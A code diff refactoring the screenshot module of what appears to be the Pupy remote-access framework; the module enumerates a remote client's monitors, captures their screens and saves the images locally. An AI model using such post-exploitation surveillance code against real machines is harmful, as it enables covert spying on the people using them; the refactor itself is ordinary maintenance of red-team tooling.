@@ -32,7 +32,6 @@
 
 from pupylib.PupyModule import *
 from os import path
-from pupylib.utils.rpyc_utils import redirected_stdio
 
 import time
 import datetime
@@ -54,34 +53,33 @@ class screenshoter(PupyModule):
         self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
 
     def run(self, args):
-        with redirected_stdio(self.client.conn):
-            rscreenshot = self.client.conn.modules['screenshot']
-            if args.enum:
-                self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
-                for i, screen in enumerate(rscreenshot.screens()):
-                    if not (screen['width'] and screen['height']):
-                        continue
+        rscreenshot = self.client.conn.modules['screenshot']
+        if args.enum:
+            self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
+            for i, screen in enumerate(rscreenshot.screens()):
+                if not (screen['width'] and screen['height']):
+                    continue
 
-                    self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
-                        i,
-                        '{}x{}'.format(screen['width'], screen['height']),
-                        '({}x{})'.format(screen['top'], screen['left'])))
-                return
+                self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
+                    i,
+                    '{}x{}'.format(screen['width'], screen['height']),
+                    '({}x{})'.format(screen['top'], screen['left'])))
+            return
 
-            screenshots, error = rscreenshot.screenshot(args.screen)
-            if not screenshots:
-                self.error(error)
-            else:
-                self.success('number of monitor detected: %s' % str(len(screenshots)))
-                
-                for screenshot in screenshots:
-                    filepath = path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".png")
-                    with open(filepath, 'w') as out:
-                        out.write(screenshot)
-                        # sleep used to be sure the file name will be different between 2 differents screenshots
-                        time.sleep(1)
-                        self.success(filepath)
+        screenshots, error = rscreenshot.screenshot(args.screen)
+        if not screenshots:
+            self.error(error)
+        else:
+            self.success('number of monitor detected: %s' % str(len(screenshots)))
+            
+            for screenshot in screenshots:
+                filepath = path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".png")
+                with open(filepath, 'w') as out:
+                    out.write(screenshot)
+                    # sleep used to be sure the file name will be different between 2 differents screenshots
+                    time.sleep(1)
+                    self.success(filepath)
 
-                    # if args.view:
-                    #     viewer = config.get('default_viewers', 'image_viewer')
-                    #     subprocess.Popen([viewer, output])
+                # if args.view:
+                #     viewer = config.get('default_viewers', 'image_viewer')
+                #     subprocess.Popen([viewer, output])
